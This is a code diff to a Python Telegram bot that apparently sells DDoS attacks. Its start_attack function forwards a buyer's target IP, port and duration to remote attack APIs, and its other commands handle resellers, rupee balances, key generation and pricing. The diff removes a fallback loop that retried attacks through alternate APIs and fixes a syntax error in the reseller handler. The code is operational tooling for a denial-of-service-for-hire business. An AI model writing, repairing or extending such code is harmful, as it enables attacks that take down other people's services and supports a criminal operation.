@@ -842,29 +842,6 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
         except Exception as e:
             print(f"[NetHunter Slot {api_index+1}] ❌ ERROR: {e}", flush=True)
 
-        if not api_success and len(API_LIST) > 1:
-            for alt_idx in range(len(API_LIST)):
-                if alt_idx == api_index:
-                    continue
-                try:
-                    alt_url = API_LIST[alt_idx].format(ip=target, port=port, duration=duration)
-                    print(f"[NetHunter Slot {alt_idx+1}] 🔄 Fallback: {alt_url}", flush=True)
-                    alt_resp = HTTP_SESSION.get(alt_url, timeout=20, verify=False)
-                    print(f"[NetHunter Slot {alt_idx+1}] ✅ Fallback Status: {alt_resp.status_code}", flush=True)
-                    if alt_resp.status_code in [200, 201, 202]:
-                        try:
-                            alt_json = alt_resp.json()
-                            if alt_json.get('success') is True:
-                                api_success = True
-                                api_response_text = alt_resp.text[:200]
-                                break
-                        except Exception:
-                            api_success = True
-                            api_response_text = alt_resp.text[:200]
-                            break
-                except Exception as e:
-                    print(f"[NetHunter Slot {alt_idx+1}] ❌ Fallback Error: {e}", flush=True)
-
         attack_start_msg = generate_attack_start_ui(target, port, duration, user_id, username)
         if not api_success:
             attack_start_msg = (
@@ -1605,7 +1582,8 @@ def add_reseller_command(message):
     try:
         bot.send_message(reseller_id, "🎉 Congratulations! Aap ab Reseller ban gaye ho!\n\n💰 Use /mysaldo to check balance\n🔑 Use /gen to generate keys\n💵 Use /prices to see pricing")
     except:
-        pass    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
+        pass
+    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
     bot.reply_to(message, f"✅ Reseller added!\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💰 Balance: 0 Rs")
 
 @bot.message_handler(commands=["remove_reseller"])
